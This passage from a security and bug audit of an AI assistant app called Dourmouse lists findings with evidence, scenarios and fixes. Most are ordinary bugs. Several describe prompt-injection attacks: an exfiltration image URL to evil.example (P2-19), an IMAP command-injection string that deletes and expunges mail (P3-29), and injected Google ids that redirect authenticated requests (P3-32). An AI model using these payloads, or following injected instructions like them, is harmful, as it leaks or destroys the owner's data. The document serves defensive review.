- evidence: `else if (how === "timeout") error = "the seek did not finish within 4 s";`
- scenario: The agent asks to seek to a point the media is already at; it is told the seek failed and may retry or give up.
- fix: Skip the wait (and the timeout error) when `Math.abs(m.currentTime - to) < 0.01` before assigning.

### A-6 [low] Adding or enabling an extension loads it only into the active profile's session; other already-started profiles never get it
- where: electron/main.js:2921 (also 2937, and startExtensions at 2826)
- problem: `addExtensionFlow` and `enableExtensionFlow` call `loadExtensionInto(paneSession(), entry)`, i.e. only the session of the profile that is active at that moment. When the owner later switches to a profile whose session was already started, `startExtensions` returns early because `extSessionInit.has(ses)`, so the registry's enabled extensions are not re-checked. Disable and remove do the opposite and unload from every session (`unloadExtensionEverywhere`), so the three paths disagree.
- evidence: `if (!ses || extSessionInit.has(ses)) return;`
- scenario: Start in profile A, switch to B, add extension E in B, switch back to A: E is registered as enabled and its confirmation text says it runs in every profile, but it is not loaded in A until the app restarts. The panel shows it as not loaded with no error.
- fix: After add or enable, load into every session in `extSessionList`, or have switchProfile call a "load any enabled extension not yet loaded in this session" pass.

### A-7 [low] Stale-server cleanup SIGTERMs whatever pid is in server.pid, which is never removed or verified
- where: electron/main.js:192
- problem: `stopStaleServer` reads `server.pid` and sends SIGTERM to that pid when a server on the port enforces an owner gate this launch does not hold. The pid file is written at every spawn (line 378) but is never deleted on quit or exit, and the pid is never checked against the process that owns the port or against its command line.
- evidence: `process.kill(pid, "SIGTERM");`
- scenario: The app crashes or is quit; its old pid is later reused by an unrelated process of the same user. A different Dourmouse server (a second deployment on port 8765, as this machine has had) then answers with an owner gate; the next launch terminates the unrelated process, and also never reaches the intended server.
- fix: Delete the pid file in before-quit and onServerExit, and before killing confirm the pid is the listener on PORT (lsof -nP -iTCP:PORT -sTCP:LISTEN) and that its command line contains dourmouse.webui.

### A-8 [low] Tray "Kill camera + mic NOW" and the toggles fail silently when the server call fails
- where: electron/main.js:789
- problem: The menu click handlers `await postKillSwitch(...)` with no try/catch. `fetchJson` has no timeout, does not look at the HTTP status, and rejects on any transport error or non-JSON body, so a stopped, restarting or gating server turns the click into an unhandled promise rejection; a 4xx JSON body resolves with no `kill_switch` and nothing is shown. The tray icon is only repainted by `refreshTray()` after the await, so it is never updated to say the kill did not happen.
- evidence: `await postKillSwitch("kill_all");`
- scenario: Server is down or restarting (the supervisor window is up to 8 s) and the owner hits the privacy kill switch from the menu bar; nothing happens, no message, and the icon still shows both dots as on or as before.
- fix: Wrap the handlers in try/catch, surface a `dialog.showErrorBox` or notification on failure, give fetchJson a timeout and a status check.

### A-9 [low] Import from Chrome merges against one profile's lists, then writes into whichever profile is active after the confirmation
- where: electron/main.js:3084
- problem: `importChromeFlow` computes `bm` and `hi` from `bookmarkStore.get()` / `historyStore.get()` (the active profile), awaits a native confirmation, then calls `bookmarkStore.set(bm.list)`. `profile:switch` is not wrapped in `nativeGuard`, so a console script (the threat model the file's own comments use) can switch profile while the dialog is open.
- evidence: `if (bm) bookmarkStore.set(bm.list);`
- scenario: Import is confirmed in profile A's dialog after a script switched to profile B: B's bookmarks and history are replaced by A's merged lists, losing B's data, while the result says it imported into A.
- fix: Capture `activeProfileName` before the dialog and abort if it changed, or take the profile switch through nativeGuard.

### P2-1 [low] DLP spaced-secret pattern is malformed, so multi-word secrets split by newline or spaces are not redacted
- where: dourmouse/governance.py:293
- problem: `gap = _INVISIBLE_OR_SPACE[:-1] + "]+"` strips only the trailing `*`, leaving the closing `]`, then appends another `]+`. The joiner regex becomes `[\s...]]+` (one whitespace char followed by one or more literal `]`), not "one or more whitespace/invisible chars".
- evidence: `_spaced_pattern("correct horse battery").search("correct​horse")` is None, but it matches the nonsense text `"correct ]horse ]battery"`.
- scenario: a .env secret value containing spaces (a passphrase) that a page, tool result or model reflows across a line break or with a zero-width gap is no longer caught by the R2B-08 "split secret" defence the docstring promises; only the exact-form match still works.
- fix: `gap = _INVISIBLE_OR_SPACE[:-1] + "+"` (or `"[\\s...]+"` built from a shared class string).

### P2-10 [low] Concurrent delegate budget is a non-atomic check-then-increment
- where: dourmouse/dispatch.py:3841
- problem: `consume_delegate` is documented as "Atomically claim one delegation budget slot" but has no lock; `delegate_parallel` branches run on several threads sharing the same `budget` list.
- evidence: `if self.budget[0] >= self.max_delegates: return False` / `self.budget[0] += 1`
- scenario: two branches read 24, both pass, both increment; the cap of 25 is exceeded (and `+=` on a list slot can lose an increment).
- fix: guard with a lock stored next to the budget list.

### P2-11 [low] Model-call deadline counts time spent queued on the local-model semaphore, then the abandoned call runs anyway
- where: dourmouse/dispatch.py:721 with :814
- problem: `future.result(timeout=deadline)` starts the clock before the worker acquires the local semaphore (default 1). With a fan-out on a local backend, queued branches hit ModelCallDeadlineExceeded without ever starting; their orphaned workers later acquire the permit and run a full generation whose result is discarded, delaying the live branches.
- evidence: `semaphore.acquire()` inside `_call_with_retry_inner`, run under the 240 s wait in `_call_with_retry`
- scenario: 4 parallel local branches of 90 s each: branches 3 and 4 fail at 240 s, then burn 180 s of local generation for nothing.
- fix: acquire the semaphore before submitting (or start the deadline after acquisition) and check `abandoned` before the real call.

### P2-12 [low] The CLI "complete answer" shortcut returns declined or confirmation text as the final answer
- where: dourmouse/dispatch.py:5669
- problem: the shortcut skips only results starting with ERROR/REFUSED/NOT CONFIGURED. "DECLINED BY USER: ...", "CONFIRMATION REQUIRED: ... Tell the user plainly ..." (text addressed to the model) and "BLOCKED BY HOOK" are returned verbatim as the assistant's reply.
- evidence: `not result_text.startswith(("ERROR", "REFUSED", "NOT CONFIGURED"))`
- scenario: forced_agent code_claude call run without a gate (MCP bridge style) shows the user the internal instruction text.
- fix: also exclude DECLINED, CONFIRMATION REQUIRED and BLOCKED BY HOOK prefixes.

### P2-15 [low] claude_code's description says it runs with default permissions, the handler bypasses all permissions
- where: dourmouse/general_roster.py:4468 (handler :390)
- problem: the tool description tells the model "headless mode runs with default permissions, so permission-gated file edits are typically declined"; the handler passes `--permission-mode bypassPermissions` without the `--disallowedTools` that code_backends.py adds for the chat backend (finding #157), so Claude Code's own Bash/Write/Edit run unchecked in any `cwd` the model names. The confirmation prompt is the only guard, and it names `cwd` and the first 1500 chars of the task.
- evidence: `argv=[cli, "-p", "--permission-mode", "bypassPermissions", *session_args, *mcp_args]`
- scenario: a model reasons from the description that edits are blocked and requests broader tasks than the owner expects; the owner approving "hand this task to Claude Code" is not told it runs without Claude's own permission prompts. A task longer than 1500 chars is only partly shown (only a generic "not shown" note).
- fix: correct the description; add `--disallowedTools` like code_backends, or state "no permission prompts" in `confirm_prompt`.

### P2-16 [low] claude_code and codex_code spawn the CLI with the bare server environment
- where: dourmouse/general_roster.py:319
- problem: `_run_cli_delegate` calls `subprocess.run` with no `env`. code_backends._cli_env exists exactly because a Dock-launched app has `PATH=/usr/bin:/bin:/usr/sbin:/sbin` (no node, no ~/.local/bin); `_find_claude_cli`/`_find_codex_cli` locate the binary by absolute path, but its helpers and `node` are not on PATH.
- evidence: `proc = subprocess.run(argv, cwd=cwd, input=stdin_text, ...)` (no `env=`)
- scenario: from the Dock app, `codex` (an npm `#!/usr/bin/env node` script) found under /opt/homebrew/bin exits with "env: node: No such file or directory"; the tool reports a non-zero exit although the CLI is installed.
- fix: pass `env=code_backends._cli_env(cli)`.

### P2-17 [low] CLI timeout message claims the task is still running although subprocess.run killed it
- where: dourmouse/general_roster.py:333
- problem: `subprocess.run(..., timeout=)` kills the child on timeout, but the returned text says "(task still running)".
- evidence: `return f"ERROR: {tool_label} timed out after {timeout}s (task still running)."`
- scenario: the model tells the owner the coding task continues in the background and waits for it; partial edits made before the kill are not mentioned.
- fix: say "the process was stopped; it may have changed files before it was stopped".

### P2-18 [low] read_agent_inbox lets any agent read (and mark read) any other agent's inbox
- where: dourmouse/general_roster.py:1903
- problem: unlike send_message (finding #064: sender is always the real calling agent), the inbox tool takes `agent` from the arguments and only checks it is a roster name; it then calls `bus.mark_read(m["id"], agent)` for that agent.
- evidence: `agent = (arguments.get("agent") or "").strip()` / `bus.mark_read(m["id"], agent)`
- scenario: a browser-pinned or research branch (which reads hostile pages) reads the security or mail agent's inbox and clears its unread badges, hiding alerts from that agent.
- fix: when `ctx.forced_agent` is set, require `agent == forced_agent`.

### P2-19 [low] Confirmation for docs_insert_image never shows the image URL
- where: dourmouse/general_roster.py:4231
- problem: the prompt is "Insert an image into Google Doc <id>?"; Google fetches `image_url` server-side, and the tool is not in OUTBOUND_TOOLS so the DLP argument gate does not look at it. `_with_unshown_note` only notes values longer than 120 characters, so a short URL (a query string carrying data) is invisible.
- evidence: `f"Insert an image into Google Doc {a.get('document_id', '?')!r}?"`
- scenario: injected page text makes the model ask to insert `https://evil.example/p.png?d=<private text>`; the owner approves a prompt with no URL and the data goes to the attacker's server via Google's fetch.
- fix: include the URL in the prompt and add `docs_insert_image` to OUTBOUND_TOOLS.

### P2-20 [low] File tools raise after writing when the workspace path contains a symlink
- where: dourmouse/general_roster.py:1502 (also :1461, :1467, :1541, :1545)
- problem: `_safe_resolve` returns a symlink-resolved target while `_workspace_root()` is not resolved; the later `target.relative_to(_workspace_root())` raises ValueError. The write has already happened.
- evidence: write_file with DOURMOUSE_WORKSPACE=/tmp/p2ws raised `'/private/tmp/p2ws/...' is not in the subpath of '/tmp/p2ws'` after creating the file
- scenario: a bookshelf project folder or DOURMOUSE_WORKSPACE reached through a symlink: every write_file/edit_file call changes the file, then returns ERROR, so the model retries and edit_file reports a "not found" the second time.
- fix: use `_workspace_root().resolve()` in those `relative_to` calls.

### P2-21 [low] Delegated runs ignore the privacy pin that _build_client enforces
- where: dourmouse/general_roster.py:2768 and :3154 (client reuse at :2779, :3192)
- problem: `delegate_task`/`delegate_parallel` pass the parent's client and resolve the model with `ctx.config.model_for_agent(target)` on the ambient config. `_config_for_agent_model` and `_build_client` exist (dispatch.py:2402) because privacy-pinned agents (mail, docs, memory, apps, system) must be forced to a local config; the comment there names three call sites that were fixed, this is a fourth.
- evidence: `nested_model = ctx.config.model_for_agent(target)` followed by `client=ctx.client`
- scenario: a cloud-eligible top-level turn delegates to `mail`; the nested run reads the inbox through the parent's Ollama Cloud client although model_delegation lists `mail` as local-only.
- fix: in the nested run use `_config_for_agent_model(ctx.config, target)` and rebuild the client when the target is in `_LOCAL_ONLY_AGENTS` (or document that the pin no longer applies).

### P2-24 [low] Bespoke prompts name tools that do not exist or have a different name
- where: dourmouse/agent_prompts.py:863 (`codex_codex`), :868 (`deploy_publish`), :1348 and :1372 (`run_privelaged_command`, `write_patj`), :2990 (`market-movers`), :2188 and :2438 (`codex_codex`), :231 (`Publish_artifact`)
- problem: the real tools are `codex_code`, `deploy`, `run_privileged_command`, `write_path`, `market_movers`, `publish_artifact`. The base prompt in dispatch.py uses the correct names, so one prompt contains both spellings. dev_coding's whole "never claim deployment unless [deploy_publish] confirms" workflow points at a tool that is not there.
- evidence: scan of every `[name]` token in AGENT_SYSTEM_PROMPTS against registered tool and agent names
- scenario: the system agent is told to use `run_privelaged_command` for elevated commands; the call returns "unknown tool ... did you mean", costing a turn (and a weak model may stop and say it cannot run privileged commands).
- fix: correct the names (and add a test that checks every bracketed token against the registry).

### P2-25 [low] research_info prompt tells the agent to use open_url, which the tool description forbids for research
- where: dourmouse/agent_prompts.py:230
- problem: prompt: `[open_url] -> open and inspect retrieved URLs or source material`. The tool opens a real tab in the owner's own browser, is confirmation-gated, and its description says never to call it to answer a question or after fetch_url fails (a live-observed bug: research questions opened two real tabs).
- evidence: `[open_url] → open and inspect retrieved URLs or source material.`
- scenario: research turns trigger approval prompts for "Open https://... in your browser?" and hijack the owner's browser; open_url cannot return page text, so nothing is "inspected".
- fix: replace with fetch_url (read) and open_browser_pane (show) in the prompt.

### P2-26 [low] music prompt points "give me a Spotify link" at spotify_link, which starts account OAuth linking; it also promises seek
- where: dourmouse/agent_prompts.py:3169 and :3194 (:3172, :3253 for seek)
- problem: `spotify_link` is the one-time "link my Spotify account" login that opens a browser; the prompt describes it as "generating or retrieving Spotify links for music content". `spotify_playback_control` supports next, previous, pause, resume and volume only (no seek).
- evidence: rule 9 `If the user asks for a Spotify link, use [spotify_link].` versus `spotify_login(background=True)`
- scenario: "send me the link to that song" opens the Spotify authorisation page in the owner's browser; "seek to 1:30" returns an error.
- fix: describe spotify_link as account linking; build track links from the URI returned by spotify_search; drop "seeking".

### P2-27 [low] comms and docs prompts promise actions the tools cannot perform
- where: dourmouse/agent_prompts.py:384 and :416 (comms), :673 and :724 (docs)
- problem: comms is told to "send an approved draft" with `send_draft`, but `_send_draft_tool` always returns NOT CONFIGURED and takes no draft id (it re-takes channel/recipient/subject/body); sending is done by gmail_send on `mail`, which the comms run does not have. docs rule 7 and EXECUTION say to confirm and then delete Drive items, but no Drive delete tool exists (dispatch.py base rule 14 says so explicitly); the docs TOOL USAGE also omits docs_append, docs_insert_image, sheets_create, sheets_append, drive_share, drive_search and drive_read although the docs agent owns them.
- evidence: `[send_draft] → send an already-prepared draft only after explicit human confirmation.` versus `return "NOT CONFIGURED: no messaging channel backend wired yet ..."`
- scenario: a COMMS-pinned chat asked to "send it" walks the owner through a confirmation and then reports NOT CONFIGURED; a docs chat asked to "delete the old sheet" asks for deletion confirmation and then has nothing to call.
- fix: have comms hand sending to `mail` (delegate_task) and remove the deletion claims; list the real docs tools.

### P2-28 [low] Bespoke prompts contradict the gates or the base prompt on confirmation
- where: dourmouse/agent_prompts.py:524 (scheduling), :3996 (browser), :1175 (admin_ops), :669 (docs), dourmouse/dispatch.py rule 15
- problem: scheduling says creating an event with an explicit date/time "does not require an additional confirmation", but `create_calendar_event` is REQUIRES_CONFIRMATION and is not even in the scheduling TOOL USAGE list. browser says forgetting stored credentials needs no confirmation, but `browser_creds_forget` is gated. admin_ops, docs and comms tell the model to ask for confirmation in chat first and only then call the tool, while base rule 15 (spliced into the same prompt) says to call the real tool at once because a chat question is "NOT an equivalent, enforceable confirmation step".
- evidence: `Creating an event at an explicitly specified date and time does not require an additional confirmation.`
- scenario: the model tells the user the event was added without confirmation, then the approval card appears; for deletion/send flows the user is asked twice (chat, then card).
- fix: align the prompt text with `permission=` per tool and delete the "confirm in chat first" steps.

### P2-29 [low] Stale or false capability claims in prompts
- where: dourmouse/agent_prompts.py:1385 (system), :2698 (worldmonitor), :4532 (companion), :2943 (news)
- problem: system describes `check_connections` as inspecting active network connections (listening vs outbound); the tool reports which external accounts/services Dourmouse can reach. worldmonitor says compute provides "additional local inference infrastructure"; compute now runs sandboxed Python jobs (the Dell node is retired). companion says it has "exactly two tools ... identical to the orchestrator's own", but the orchestrator also owns `delegate_to_models`, and the shared desk tools are added to every scoped run. The news prompt ends with a stray "DOURMOUSE [markets] Agent" line although the module docstring says those running headers were stripped.
- evidence: `DOURMOUSE [markets] Agent""",` at the end of the "news" entry
- scenario: "what is connected to my network" returns account status; the stray line and wrong tool counts leak into the model's instructions.
- fix: correct the four statements.

### P2-30 [low] "429" substring makes any error text containing those digits a rate-limit signal
- where: dourmouse/model_router.py:35 (used at dourmouse/dispatch.py:906)
- problem: `is_rate_limit_error` lowercases `str(exc)` and checks `"429" in text`; a request id, port, byte count or timestamp containing 429 matches. `dispatch` then rotates accounts and (after the first failure) marks the previous account cooling for 60 s.
- evidence: `_RATE_LIMIT_MARKERS = ("429", "rate limit", ...)`
- scenario: a 500 or timeout whose message contains "id 4291" with two accounts configured moves the turn to the other key and puts a healthy key in cooldown.
- fix: match `\b429\b` or check the HTTP status attribute first.

### P2-31 [low] The identical-call cap is shared by the whole request tree, so fan-outs with zero-argument tools are refused after three calls
- where: dourmouse/execution_policy.py:81 (policy shared at dourmouse/dispatch.py:4240 and general_roster.py:3209)
- problem: after finding #140 one RunPolicy covers every delegate and every fan-out branch; `max_identical` (default 3) counts (tool, arguments-hash) over the whole request. Zero-argument or default-argument calls (system_info, news_headlines, world_pulse, list_running_apps, spotify_playback_state, compute_job_status polling) hash identically in every branch.
- evidence: `if self.calls[key] >= self.max_identical: return (f"'{name}' was already called ...`
- scenario: delegate_parallel with five branches that each call `news_headlines {}` or poll a job: the fourth and fifth branch get "the runtime will not repeat it again" and report a failure.
- fix: key the counter per branch call_id (keep a request-wide cap only for gated actions), or raise the cap for read-only tools.

### P2-8 [low] Stopping a run between tool calls leaves an assistant tool_calls message with no tool results in history
- where: dourmouse/dispatch.py:5520
- problem: the assistant message with all `tool_calls` is appended first; if `should_stop()` fires before a tool call the loop returns without tool messages (the between-turn stop path at 5125 appends an assistant message, this one does not).
- evidence: `messages.append(assistant_msg)` then `if should_stop is not None and should_stop(): ... return {...}`
- scenario: STOP pressed during a multi-tool turn on an OpenAI-compatible backend; the persisted history has unanswered tool_call ids and the next request is rejected (400) until the session is cleared.
- fix: before returning, append a tool message ("cancelled by the user") for every unanswered tool_call id.

### P2-9 [low] DlpFilter's promise is not met for tool_use arguments and live deltas
- where: dourmouse/dispatch.py:5526 and :5223
- problem: the DlpFilter docstring says secrets are redacted before text is written to the transcript. `use_entry["raw_arguments"]`, the assistant tool_call message sent back to the model, and every `assistant_delta`/`thinking_delta` event carry unredacted text; only tool results and the final assistant_text are redacted.
- evidence: `"raw_arguments": tool_call.function.arguments,`
- scenario: a user pastes a key and says "remember this"; the key is in the persisted session transcript and on screen via the streamed deltas even though the stored final text shows `[REDACTED]`.
- fix: redact raw_arguments (and the stored assistant tool_call arguments) with `dlp.redact` before appending/emitting.

### P3-1 [low] publish_artifact tool does not lowercase kind before deciding to JSON-parse content
- where: dourmouse/artifacts.py:226-237
- problem: the tool wrapper tests `kind in ("table", "series")` on the raw, un-lowercased kind, while `ArtifactStore.publish` lowercases and strips it (line 83). A model that sends kind="Table" or "SERIES" with its content as a JSON string skips json.loads, so the string reaches `_validate` and is rejected.
- evidence: `if isinstance(raw_content, str) and kind in ("table", "series"):`
- scenario: model calls publish_artifact(kind="Table", content="{\"columns\":[...],\"rows\":[...]}") and gets "table artifact content must be JSON {columns, rows}" although the content is valid JSON.
- fix: normalise `kind = kind.lower()` in the wrapper before the membership test.

### P3-10 [low] The shared-desk awareness hint is never sent on the CODE chat path
- where: dourmouse/code_backends.py:176-187, 674, 875-883
- problem: `_SHARED_DESK_HINT` is documented as "told to a CODE chat once per session", but it is prepended only in `_run_claude`. `stream_claude`, which is what webui.py:6050 calls for the CODE chat, prepends only the orchestrator preamble.
- evidence: grep shows `_SHARED_DESK_HINT` used at code_backends.py:674 only.
- scenario: the CODE chat model never learns about open_browser_pane or the player tools, which is the gap the hint was added to close.
- fix: prepend the hint in the `_first_turn` block of `stream_claude` as well.

### P3-12 [low] The once-per-session preamble gate is keyed on a session id recorded before the first run succeeds
- where: dourmouse/code_backends.py:259-268, 665-674, 875-883
- problem: `_claude_session_args` stores the new id in `_CLAUDE_SESSIONS` before `claude` has run. If that first run fails or times out, the next call sees `session_key in _CLAUDE_SESSIONS`, so `_first_turn` is False and no preamble or desk hint is sent. The `--resume` of the never-created session then fails with "No conversation found", the code starts a fresh session and re-runs without any preamble.
- evidence: `_first_turn = session_key not in _CLAUDE_SESSIONS`
- scenario: first message in a new tab times out; the retry starts a real session in which the model has never been told its tools or agents.
- fix: record the id only after exit 0, or compute `_first_turn` from the `--session-id` vs `--resume` choice made under the run lock.

### P3-13 [low] stream_claude reads stderr only after stdout hits EOF
- where: dourmouse/code_backends.py:898-916, 942, 1025-1030
- problem: stdout and stderr are both PIPEs and stderr is drained only after the stdout loop ends. If the CLI writes more than a pipe buffer (about 64 KB) to stderr while running, it blocks on stderr and stdout never reaches EOF until the watchdog kills it at the timeout.
- evidence: `stderr=subprocess.PIPE,`
- scenario: a verbose MCP/plugin warning storm stalls the stream and the user sees nothing until timeout; the error then includes the (truncated) stderr.
- fix: drain stderr in a thread, or redirect it to a temp file.

### P3-14 [low] format_connections always reports the Freebuff API as not ready
- where: dourmouse/connections.py:456 (with freebuff_status at :410-438)
- problem: the report reads `fb.get("api_ready")`, but `freebuff_status()` only ever sets app_running, ok, hint, detail and account; nothing in the repo sets `api_ready`. The "FREEBUFF API" line therefore always prints "app running · no authed account", even when `ok` is True and the line above says it is connected.
- evidence: `"FREEBUFF API: " + ("ready" if fb.get("api_ready") else "app running · no authed account")`
- scenario: the check_connections tool tells the model and the user the Freebuff account is not authed when it is, contradicting the "freebuff:" row of the same report.
- fix: use `fb.get("ok")`.

### P3-15 [low] A malformed DOURMOUSE_MEMORY_REMOTE_URL port crashes the whole connections report
- where: dourmouse/connections.py:344-345
- problem: `urlsplit(...).port` raises ValueError for a non-numeric or out-of-range port. This code is outside any try block, although the module contract says a probe never crashes the report.
- evidence: `_mhost, _mport = _mp.hostname or "", _mp.port or 8765`
- scenario: DOURMOUSE_MEMORY_REMOTE_URL=host:abc in .env makes check_connections (and every HUD poll using it) raise, which is exactly the situation the probe was added to diagnose. Verified: urlsplit("http://h:abc").port raises ValueError.
- fix: wrap in try/except ValueError and report the URL as invalid.

### P3-16 [low] email_send_via_smtp lets header, port and socket errors escape although it promises "Nothing was sent" strings
- where: dourmouse/email_identity.py:131-156
- problem: only smtplib.SMTPException is caught. `int(smtp["port"])` with a bad env value, `msg["Subject"] = subject` with an embedded newline (EmailMessage raises ValueError), and any connection failure (ConnectionRefusedError, socket.gaierror, TimeoutError, ssl.SSLError are OSError, not SMTPException) all propagate as raw exceptions.
- evidence: `except smtplib.SMTPException as exc:`
- scenario: wrong host or no network gives a Python traceback to the tool layer instead of the documented "EMAIL OWN SEND FAILED ... Nothing was sent." text.
- fix: catch (OSError, ValueError) as well and return the same failure string.

### P3-18 [low] save_config re-parses the .env by hand and fails permanently on valid dotenv syntax
- where: dourmouse/firstrun.py:204-221
- problem: the merge loop splits on "=" and keeps the raw key. The file is read elsewhere by python-dotenv, which accepts `export NAME=value`. Such a line yields the key "export NAME", which `env_lines` rejects with ValueError, so the whole save returns "could not write config" every time. The same rewrite also drops all of the user's comments and blank lines, and `write_text` is not atomic (a crash mid-write truncates a file that holds every API key) and creates a new file with the default umask before the chmod at :224.
- evidence: `k, _, v = line.partition("=")`
- scenario: a user whose ~/.../.env has `export NVIDIA_API_KEY=...` cannot finish first-run setup; the error message names the setting as invalid.
- fix: strip a leading `export ` when parsing, write to a temp file created with 0o600 and `os.replace` it.

### P3-19 [low] forex_paper reports $0.00 realised P&L if any single row has a non-numeric pnl_usd
- where: dourmouse/forex_ops.py:332-335
- problem: the sum is computed inside one try; a ValueError on a single bad cell discards the whole sum and sets `total_pnl = 0.0`. `_forex_paper_tool` then prints "realised P&L: $0.00" with no warning.
- evidence: `except ValueError:` followed by `total_pnl = 0.0`
- scenario: one row with "N/A" or "1,234.50" in pnl_usd and the tool tells the model and user the paper strategy has made exactly zero.
- fix: skip bad rows individually and report a count of unparseable rows.

### P3-21 [low] freebuff_dispatch accepts any absolute path, although its docs say it must be a path Freebuff already knows
- where: dourmouse/freebuff_bridge.py:169-176, 183-191
- problem: `_validate_project_path` only checks `startswith("/")`. The tool description and the docstring say the path must come from freebuff_projects, and the "refusing path-like input" safeguards exist for thread ids, but nothing compares the path with the project list or normalises `..` segments.
- evidence: `if not p.startswith("/"):`
- scenario: the model dispatches an agent into "/" or "/Users/x/.ssh/.." (the user sees the path in the confirmation but the claimed guard does not exist).
- fix: check the path against `freebuff_projects()` paths after `os.path.normpath`.

### P3-23 [low] The "bounded" kinetic graph is bounded only by age, not by size
- where: dourmouse/gdelt_graph.py:232-265, 267-281
- problem: each record adds up to C(10,2)=45 edge entries, and up to 4000 records are ingested per file, every 15 minutes, with edges retained for 6 hours (24 files). Nothing caps the node or edge dict count, only `prune` by last_seen. This is an estimate from the constants in the file, not a measurement.
- evidence: `def prune(self, max_age_seconds: float, now: float | None = None)` (only age-based)
- scenario: a busy news period grows `_edges` to hundreds of thousands to millions of dicts held in the server process, while the module docstring promises a bounded graph.
- fix: add a max-edges cap that evicts the lowest-weight/oldest entries after each ingest.

### P3-25 [low] Orphan recovery spends two attempts for one interrupted run
- where: dourmouse/goal_runtime.py:173-177, 256-259
- problem: `_run_task` already increments `attempt_count` when it marks the task RUNNING. Recovery then moves the orphan to RETRYING with `increment_attempt=True`, and the retry run increments again, so a single interrupted execution consumes two attempts before the task has been retried.
- evidence: `"RETRYING", increment_attempt=True,`
- scenario: with max_attempts=3, one restart mid-task leaves one real retry; a second restart marks the task FAILED ("no attempts left") although it only ran twice.
- fix: do not increment in the recovery path.

### P3-26 [low] create_goal's tool description promises concurrent execution of independent tasks, but the runtime runs them one at a time
- where: dourmouse/goal_tools.py:208-209 (versus dourmouse/goal_runtime.py:210-214)
- problem: the description tells the model "Independent tasks (no shared depends_on) run concurrently." `_advance_goal` takes up to `_MAX_TASKS_PER_TICK` runnable tasks and runs them in a plain for loop, each `_run_task` blocking on a full LLM round trip plus a verification round trip, so they are strictly sequential.
- evidence: `self._run_task(current, task)` inside `for task in runnable:`
- scenario: the model plans wide fan-out goals and tells the user they will run in parallel; wall-clock time is the sum, and a tick can hold the single worker thread for minutes while every other goal waits.
- fix: run the batch on a thread pool (the constant already implies it) or correct the description.

### P3-27 [low] Goal tools accept unvalidated depends_on ids and non-list success_criteria
- where: dourmouse/goal_tools.py:60, 76, 88-92, 121-125
- problem: raw (non-"#N") `depends_on` entries are passed straight to `store.create_task`, which does not check that they exist or belong to this goal. Such a task stays PENDING forever and the goal is eventually marked BLOCKED with the generic "depends on a task that will never complete". `success_criteria` is passed as-is; a string from the model is stored as a JSON string, and `_complete_goal` then iterates it character by character into a bullet list of one-letter "criteria".
- evidence: `success_criteria=arguments.get("success_criteria") or None,`
- scenario: the model passes success_criteria="the email was sent" and the verifier is asked to judge 17 single-character criteria; or it mistypes a task id and the goal blocks with a misleading reason.
- fix: validate ids against `store.list_tasks(goal_id)` and require a list of strings for success_criteria.

### P3-28 [low] run_globe_action reports every HTTP error from the bridge as "not reachable", discarding the bridge's own message
- where: dourmouse/gods_eye.py:81-86
- problem: `urllib.error.HTTPError` is a subclass of URLError, so the bridge's honest 503 ("action queue full - no browser tab appears to be draining it") and 400 responses (verified in gods-eye-view/vite.config.js:7365-7390) land in the `except URLError` branch and are reported as "NOT CONFIGURED: dev server is not reachable ... Start it". The JSON error body is never read, despite the module docstring promising the bridge's own message is relayed.
- evidence: `except urllib.error.URLError as exc:`
- scenario: the dev server is up but no globe tab is open and the queue fills; the user is told to start a server that is already running.
- fix: catch HTTPError first and return/raise with its body.

### P3-29 [low] gmail_search (IMAP path) only swaps double quotes, so backslash and CR/LF in the query reach the IMAP command
- where: dourmouse/google_services.py:1312-1339
- problem: `safe = query.replace('"', "'")` is the only sanitising. A trailing backslash escapes the closing quote and produces a malformed command, and CR/LF characters are sent as-is inside `conn.search(None, f'(X-GM-RAW "{safe}")')`. imaplib in Python 3.11 and 3.12 has no control-character check (verified by reading `IMAP4._command`); only 3.13+/the repo's .venv 3.14 rejects CR/LF with ValueError. On the older interpreters a query such as `x"\r\nA2 SELECT INBOX\r\nA3 STORE 1:* +FLAGS (\Deleted)\r\nA4 EXPUNGE` could run extra IMAP commands, bypassing the `readonly=True` select. On 3.14 the ValueError is raised again by the fallback `conn.search` and escapes the tool as a raw exception.
- evidence: `safe = (query or "").strip().replace('"', "'")`
- scenario: a prompt-injected email makes the model pass a crafted search string; on a 3.11/3.12 interpreter this is IMAP command injection against the owner's mailbox (App-Password path only).
- fix: reject or strip `\r`, `\n`, `\0` and escape backslashes before building the command.

### P3-31 [low] Drive search escapes apostrophes the wrong way, so any query containing one fails
- where: dourmouse/google_services.py:561-568
- problem: the comment says "single quotes are escaped by doubling", but the Drive v3 `q` grammar escapes a single quote with a backslash (`\'`), and backslash itself must be escaped. With `''` the string literal ends early and the remainder is parsed as query syntax, which Drive rejects with 400 "Invalid Value". The same unescaped path is used for `file_type`.
- evidence: `safe = q.replace("'", "''")`
- scenario: drive_search("Dave's notes") returns a Google 400 error instead of results; a backslash in the query likewise breaks the clause.
- fix: `q.replace("\\", "\\\\").replace("'", "\\'")`.

### P3-32 [low] Model-supplied Google ids are interpolated into API URLs without validation
- where: dourmouse/google_services.py:1154 (drive_share), 598 and 755 (drive_read, docs_append), 354-356 (gmail_read OAuth)
- problem: drive_share puts `file_id` into the URL path with no quoting at all. drive_read, docs_append and docs_insert_image use `urllib.parse.quote(...)`, whose default `safe="/"` keeps slashes, and gmail_read on the OAuth path never applies `_MSG_ID_RE` (which exists at line 1449 and is used by the other Gmail tools). `_valid_google_id` is used only by the Sheets/download tools. Ids containing `/`, `..`, `?` or `#` can therefore redirect the authed request to a different endpoint on the same Google host with the user's bearer token.
- evidence: `f"{_DRIVE_API}/files/{fid}/permissions"` with `fid = (file_id or "").strip()`
- scenario: a prompt-injected id such as `X/permissions/..` turns a "read" or "share" into a request to another Drive/Gmail/Docs path; impact is bounded to what the granted scopes allow on the same host.
- fix: validate every id with `_valid_google_id`/`_MSG_ID_RE` and use `quote(..., safe="")`.

### P3-33 [low] Partially created Drive docs and Slides decks are not reported when the second call fails for a reason other than 403
- where: dourmouse/google_services.py:671-688, 992-1007, 1072-1088
- problem: `_drive_create_oauth` and `_slides_create_oauth` create the file first, then write content or slides in a second call. Only a 403 is rewritten to say "the empty doc/deck was created". A timeout, 429 or 5xx is re-raised unchanged, and the caller prints it as a plain failure, so the user and model believe nothing was created.
- evidence: `raise` after `if "403" in msg:` in the content PATCH handler
- scenario: a transient 500 on the PATCH leaves an empty doc in Drive; the model retries and a second doc is created.
- fix: in every failure branch after the file id is known, include the id and "was created but ..." in the message.

### P3-35 [low] Codex history import hides schema drift and mishandles the DB path in its read-only URI
- where: dourmouse/history_import.py:289-307
